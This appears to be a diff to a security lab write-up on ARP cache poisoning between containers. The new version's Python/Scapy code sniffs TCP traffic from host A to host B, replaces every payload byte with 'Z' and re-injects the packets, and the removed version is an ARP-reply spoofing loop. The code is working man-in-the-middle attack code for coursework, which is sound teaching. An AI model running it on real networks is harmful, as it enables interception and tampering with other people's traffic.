@@ -93,25 +93,44 @@ sendp(ethernet/arp)
 Here is an example of a sniff-and-spoof program that intercepts TCP packets between Container A and Container B on the same LAN and replaces each typed character with a fixed character (Z):
 
 ```
-#!/usr/bin/env python3 
-from scapy.all import * 
-# Set the target IP addresses  
-target_a_ip = '10.9.0.5' 
-target_b_ip = '10.9.0.6' 
-# Set the MAC addresses for Hosts A, B, and M 
-host_a_mac = '02:42:0a:09:00:05' 
-host_b_mac = '02:42:0a:09:00:06' 
-host_m_mac = '02:42:0a:09:00:69' 
-# Create the ARP reply packets 
-arp_a = ARP(op=2, hwsrc=host_m_mac, psrc=target_b_ip, hwdst=host_a_mac, pdst=target_a_ip)  
-arp_b = ARP(op=2, hwsrc=host_m_mac, psrc=target_a_ip, hwdst=host_b_mac, pdst=target_b_ip) 
-# Send the packets continuously every 5 seconds 
-while True: 
-       send(arp_a) 
-       send(arp_b) 
-       time.sleep(5) 
+#!/usr/bin/env python3
+from scapy.all import *
+
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+
+def spoof_pkt(pkt):
+    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+        # Create a new packet based on the captured one.
+        # 1) We need to delete the checksum in the IP & TCP headers,
+        # because our modification will make them invalid.
+        # Scapy will recalculate them if these fields are missing.
+        # 2) We also delete the original TCP payload.
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].payload)
+        del(newpkt[TCP].chksum)
+
+        # Construct the new payload based on the old payload.
+        if pkt[TCP].payload:
+            newdata = b'Z' * len(pkt[TCP].payload)
+            send(newpkt/newdata)
+        else:
+            send(newpkt)
+    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+        # Create new packet based on the captured one
+        # Do not make any change
+        newpkt = IP(bytes(pkt[IP]))
+        del(newpkt.chksum)
+        del(newpkt[TCP].chksum)
+        send(newpkt)
+
+f = 'tcp'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
 ```
-In this example, the program uses Scapy to sniff for TCP packets between Container A and Container B on the same LAN. If a TCP packet containing raw data is found, the program modifies the raw data by replacing each typed character with Z. Then, the program creates a new IP header with the source and destination IP addresses, a new TCP header with the source and destination port numbers, and a new packet with the spoofed IP and TCP headers and the modified raw data. Finally, the program sends the spoofed packet to Container B. The program is designed to run on an attacker container with the IP address of 10.9.0.105 and the MAC address of 02:42:0a:09:00:69. The network interface for sending the spoofed packet is set to 'eth0'.
+In this script, I added a newdata variable that contains the payload data consisting of a series of Z's. If the original payload data is not empty, it should use the length of the original payload data to generate a string of Z's with the same length. The script then replaces the original payload data with the new data and send the modified packet.
 
 ### With IP Forwarding Enabled
 
